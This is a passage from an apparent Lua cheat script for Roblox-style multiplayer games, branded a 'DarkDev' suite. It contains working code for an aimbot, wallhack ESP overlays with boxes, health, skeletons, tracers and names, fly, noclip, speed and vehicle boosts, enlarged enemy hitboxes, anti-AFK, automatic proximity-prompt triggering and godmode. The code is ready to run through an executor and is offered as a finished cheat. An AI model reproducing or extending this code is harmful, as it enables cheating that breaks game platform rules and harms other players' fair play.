    return target
end

RunService.RenderStepped:Connect(function()
    if FOVCircle then
        FOVCircle.Position = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
        FOVCircle.Radius = getgenv().Config.AimbotFOV
        FOVCircle.Visible = getgenv().Config.FOVVisible
    end

    if getgenv().Config.Aimbot and UIS:IsMouseButtonPressed(Enum.UserInputType.MouseButton2) then
        local target = GetClosestTarget()
        if target and target.Character and target.Character:FindFirstChild(getgenv().Config.AimbotTarget) then
            local targetPos = Camera:WorldToViewportPoint(target.Character[getgenv().Config.AimbotTarget].Position)
            local mousePos = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y/2)
            local moveX = (targetPos.X - mousePos.X) / getgenv().Config.AimbotSmooth
            local moveY = (targetPos.Y - mousePos.Y) / getgenv().Config.AimbotSmooth
            mousemoverel(moveX, moveY)
        end
    end
end)

-- --- MODULE 7: ESP RENDER LOOP WITH NAMES & DISTANCE ---
local ESP_Objects = {}
local function CreateESP(p)
    if Drawing then
        local data = { Box = Drawing.new("Square"), Skelly = Drawing.new("Line"), Health = Drawing.new("Line"), Tracer = Drawing.new("Line"), Info = Drawing.new("Text") }
        data.Box.Thickness = 1.5; data.Box.Filled = false
        data.Skelly.Thickness = 1.5
        data.Health.Thickness = 2; data.Health.Color = Color3.fromRGB(0, 255, 100)
        data.Tracer.Thickness = 1.5
        data.Info.Size = 13; data.Info.Center = true; data.Info.Outline = true; data.Info.Color = Color3.fromRGB(255, 255, 255)
        ESP_Objects[p] = data
    end
end

RunService.RenderStepped:Connect(function()
    for p, d in pairs(ESP_Objects) do
        if getgenv().Config.ESP and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            local HRP = p.Character.HumanoidRootPart
            local Pos, Vis = Camera:WorldToViewportPoint(HRP.Position)
            if Vis then
                local S = (Camera:WorldToViewportPoint(HRP.Position - Vector3.new(0, 3, 0)).Y - Camera:WorldToViewportPoint(HRP.Position + Vector3.new(0, 2.6, 0)).Y)
                d.Box.Size = Vector2.new(S * 1.3, S); d.Box.Position = Vector2.new(Pos.X - S/1.5, Pos.Y - S/2); d.Box.Color = getgenv().Config.BoxColor; d.Box.Visible = getgenv().Config.Box
                if getgenv().Config.Health and p.Character:FindFirstChildOfClass("Humanoid") then
                    local H = p.Character:FindFirstChildOfClass("Humanoid")
                    d.Health.From = Vector2.new(Pos.X + S/1.5 + 4, Pos.Y + S/2); d.Health.To = Vector2.new(Pos.X + S/1.5 + 4, Pos.Y + S/2 - (S * math.clamp(H.Health/H.MaxHealth, 0, 1))); d.Health.Visible = true
                else d.Health.Visible = false end
                if getgenv().Config.Skeleton and p.Character:FindFirstChild("Head") then
                    local HP = Camera:WorldToViewportPoint(p.Character.Head.Position)
                    d.Skelly.From = Vector2.new(HP.X, HP.Y); d.Skelly.To = Vector2.new(Pos.X, Pos.Y); d.Skelly.Color = getgenv().Config.SkellyColor; d.Skelly.Visible = true
                else d.Skelly.Visible = false end
                if getgenv().Config.Tracers then
                    d.Tracer.From = Vector2.new(Camera.ViewportSize.X/2, Camera.ViewportSize.Y); d.Tracer.To = Vector2.new(Pos.X, Pos.Y + S/2); d.Tracer.Color = getgenv().Config.TracerColor; d.Tracer.Visible = true
                else d.Tracer.Visible = false end
                if getgenv().Config.Names or getgenv().Config.Distance then
                    local dist = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart") and math.floor((LP.Character.HumanoidRootPart.Position - HRP.Position).Magnitude) or 0
                    local txt = ""
                    if getgenv().Config.Names then txt = p.Name end
                    if getgenv().Config.Distance then txt = txt .. " [" .. dist .. "m]" end
                    d.Info.Text = txt
                    d.Info.Position = Vector2.new(Pos.X, Pos.Y - S/2 - 16)
                    d.Info.Visible = true
                else d.Info.Visible = false end
            else d.Box.Visible = false; d.Health.Visible = false; d.Skelly.Visible = false; d.Tracer.Visible = false; d.Info.Visible = false end
        else if d then d.Box.Visible = false; d.Health.Visible = false; d.Skelly.Visible = false; d.Tracer.Visible = false; d.Info.Visible = false end end
    end
end)

-- --- MODULE 8: FLY, ANTI-FALL DAMAGE & MOVEMENT ENGINE ---
UIS.JumpRequest:Connect(function()
    if getgenv().Config.InfJump and LP.Character and LP.Character:FindFirstChildOfClass("Humanoid") then
        LP.Character:FindFirstChildOfClass("Humanoid"):ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- Anti-Fall Damage Logic
RunService.Stepped:Connect(function()
    if getgenv().Config.Noclip and LP.Character then
        for _, part in ipairs(LP.Character:GetDescendants()) do
            if part:IsA("BasePart") then part.CanCollide = false end
        end
    end
    
    if getgenv().Config.AntiFallDamage and LP.Character then
        local hrp = LP.Character:FindFirstChild("HumanoidRootPart")
        if hrp and hrp.Velocity.Y < -50 then
            hrp.Velocity = Vector3.new(hrp.Velocity.X, -25, hrp.Velocity.Z)
        end
    end
end)

RunService.RenderStepped:Connect(function()
    local Char = LP.Character
    if not Char or not Char:FindFirstChild("HumanoidRootPart") then return end
    local HRP = Char.HumanoidRootPart
    local Hum = Char:FindFirstChildOfClass("Humanoid")
    
    FlyOverlay.Visible = (getgenv().Config.Fly or getgenv().Config.LegitFly) and not Main.Visible
    
    if getgenv().Config.Fly or getgenv().Config.LegitFly then
        local V = 0
        if getgenv().Config.FlyUp then V = getgenv().Config.FlySpeed elseif getgenv().Config.FlyDown then V = -getgenv().Config.FlySpeed else V = 0 end
        local moveDir = Hum and Hum.MoveDirection or Vector3.new(0,0,0)
        local hVel = moveDir * getgenv().Config.FlySpeed
        if getgenv().Config.LegitFly then
            HRP.Velocity = Vector3.new(hVel.X + (math.random(-5, 5)/100), V, hVel.Z + (math.random(-5, 5)/100))
        else
            HRP.Velocity = Vector3.new(hVel.X, V, hVel.Z)
        end
    end
    
    if Hum then
        if getgenv().Config.SpeedActive then Hum.WalkSpeed = getgenv().Config.SpeedValue or 45 else Hum.WalkSpeed = 16 end
    end
    
    -- Vehicle Boost Engine
    if getgenv().Config.VehicleBoost and Hum and Hum.SeatPart and Hum.SeatPart:IsA("VehicleSeat") then
        local seat = Hum.SeatPart
        seat.MaxSpeed = getgenv().Config.VehicleSpeed or 220
        seat.Torque = 100
        if UIS:IsKeyDown(Enum.KeyCode.W) then
            seat.AssemblyLinearVelocity = seat.CFrame.LookVector * (getgenv().Config.VehicleSpeed or 220)
        end
    end
end)

-- --- MODULE 9: HITBOX EXPANDER ---
RunService.RenderStepped:Connect(function()
    if getgenv().Config.HitboxExpander then
        local hSize = Vector3.new(getgenv().Config.HitboxSize or 12, getgenv().Config.HitboxSize or 12, getgenv().Config.HitboxSize or 12)
        for _, p in ipairs(Players:GetPlayers()) do
            if p ~= LP and p.Character and p.Character:FindFirstChild("Head") and p.Character and p.Character:FindFirstChild("Humanoid") and p.Character.Humanoid.Health > 0 then
                pcall(function()
                    local head = p.Character.Head
                    head.Size = hSize
                    head.Transparency = 0.6
                    head.Color = getgenv().Config.ThemeColor
                    head.Material = Enum.Material.Neon
                    head.CanCollide = false
                end)
            end
        end
    end
end)

-- --- MODULE 10: SAFETY & ANTI-AFK ---
LP.Idled:Connect(function()
    if getgenv().Config.AntiAFK then
        VirtualUser:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(1)
        VirtualUser:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end
end)

-- Proximity Prompt Interactor
task.spawn(function()
    while task.wait(0.1) do
        if getgenv().Config.AutoPrompts then
            for _, prompt in ipairs(workspace:GetDescendants()) do
                if prompt:IsA("ProximityPrompt") then
                    prompt.HoldDuration = 0
                    if fireproximityprompt then
                        fireproximityprompt(prompt)
                    end
                end
            end
        end
    end
end)

RunService.Heartbeat:Connect(function()
    local Char = LP.Character
    if Char and Char:FindFirstChild("HumanoidRootPart") and Char:FindFirstChild("Humanoid") then
        local hrp = Char.HumanoidRootPart
        local hum = Char.Humanoid
        if hrp.Position.Y < -800 then
            hrp.CFrame = CFrame.new(hrp.Position.X, 50, hrp.Position.Z)
            hrp.Velocity = Vector3.new(0, 0, 0)
        end
        if (hum.PlatformStand or hum.Sit) and getgenv().Config.Godmode then
            hum.PlatformStand = false
            hum.Sit = false
        end
    end
end)

for _, p in pairs(Players:GetPlayers()) do if p ~= LP then CreateESP(p) end end
Players.PlayerAdded:Connect(CreateESP)

SendDarkDevNotification("DarkDev Greek RP Suite", "Loaded Successfully v90.0")
print("DarkDev Greek RP FiveM NUI v90.0 Master Suite Loaded Successfully.")
